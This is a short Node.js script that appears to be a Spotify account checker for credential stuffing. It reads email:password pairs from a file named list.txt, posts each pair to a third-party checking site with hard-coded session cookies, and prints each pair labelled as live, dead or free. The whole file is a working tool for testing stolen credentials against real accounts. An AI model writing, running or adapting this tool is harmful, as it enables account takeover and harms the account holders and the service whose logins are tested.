const axios = require('axios');
const readline = require('readline');
const fs = require('fs')

const check = async (mail, pass) => {
  const data = `checker=spotify&mplist=${mail}%3A${pass}%09\n\n`;
  const config = {
    method: 'post',
    url: 'https://checkz.net/tools/ajax.php',
    headers: {
      'Host': 'checkz.net',
      'Connection': 'close',
      'Content-Length': '61',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://checkz.net',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://checkz.net/tools/spotify-account-checker',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Cookie': '__cfduid=dce9432ac3c61720c139afc040ce558741605797959; PHPSESSID=vrvjjdjdsm6ccnrhps3s4staod; _ym_uid=1605797966626953832; _ym_d=1605797966; _ym_isad=2; __cf_bm=dda4f68c9437a432557259b4016e9e298189416e-1605797992-1800-AZUGtr966Ppni+OJkA0zLK1Xc0cGIkjeMgM3tlMPaT+D0LqIyK/hcms7Am3I4Ht66GJ5BVyY7+2cAF6tktplFJoKUNW0bnMc0uKlwJuCIpHhxCpBVxdgXgiMjiWQgg2B3IlycEU2vBJAt5h5+O+2lQo=; _gid=GA1.2.1801934548.1605797995; _ym_visorc_53590723=w; _ga_5VRKQW0HMH=GS1.1.1605797965.1.1.1605798095.0; _ga=GA1.2.1391647826.1605797994; __gads=ID=0d577e996f11d3e7-2250f8e5d6c40050:T=1605798098:RT=1605798098:S=ALNI_MbvIpVzCR0tCtdWUa466ibyuYTjyw'
    },
    data: data
  };

  await axios(config)
    .then(function (response) {
      if (response.data.icerik != undefined) {
        let rgx = /<font color="(.+?)">/g
        let resColor = rgx.exec(response.data.icerik)
        switch (resColor[1]) {
          case 'red':
            console.log('\x1b[31m%s\x1b[0m', `[DIE] ${mail}:${pass}`)
            break;
          case 'green':
            console.log('\x1b[32m%s\x1b[0m', `[LIVE] ${mail}:${pass}`)
            break;
          case 'blue':
            console.log('\x1b[32m%s\x1b[0m', `[FREE] ${mail}:${pass}`)
            break;
        }
      }
    })
    .catch(function (error) {
      // console.log(error);
    });
}

const readList = () => {
  let res;
  const readInterface = readline.createInterface({
    input: fs.createReadStream('list.txt'),
  });
  readInterface.on('line', function (line) {
    res = line.split(/[:]+/)
    if (res[1].match(/\t/g)) {
      res[1] = res[1].slice(0, -1)
    }
    check(res[0], res[1])
  });
}

readList();